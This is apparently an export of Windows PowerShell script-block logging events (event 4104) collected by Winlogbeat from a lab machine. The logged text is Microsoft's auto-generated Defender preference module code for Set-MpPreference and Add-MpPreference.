          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {
          [object]$__cmdletization_value = ${DisableGradualRelease}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {
          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {
          [object]$__cmdletization_value = ${EnableDnsSinkhole}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {
          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {
          [object]$__cmdletization_value = ${DisableRdpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {
          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {
          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {
          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {
          [object]$__cmdletization_value = ${ScanScheduleOffset}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {
          [object]$__cmdletization_value = ${DisableTDTFeature}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTamperProtection')) {
          [object]$__cmdletization_value = ${DisableTamperProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-MpPreference' -Alias '*'
        

function Add-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Add1')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Add1')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]


ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {
          [object]$__cmdletization_value = ${DisableGradualRelease}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {
          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {
          [object]$__cmdletization_value = ${EnableDnsSinkhole}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {
          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {
          [object]$__cmdletization_value = ${DisableRdpParsing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {
          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {
          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {
          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {
          [object]$__cmdletization_value = ${ScanScheduleOffset}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {
          [object]$__cmdletization_value = ${DisableTDTFeature}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableTamperProtection')) {
          [object]$__cmdletization_value = ${DisableTamperProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTamperProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-MpPreference' -Alias '*'
        

function Add-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Add1')]
    [Alias('tiddefaci')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [long[]]
    ${ThreatIDDefaultAction_Ids},

    [Parameter(ParameterSetName='Add1')]
    [Alias('tiddefaca')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]",9,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3338,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",aHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.205",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (10 of 20):

    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]
    ${ThreatIDDefaultAction_Actions},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Add1')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Add1')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Add1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Add1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Add1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
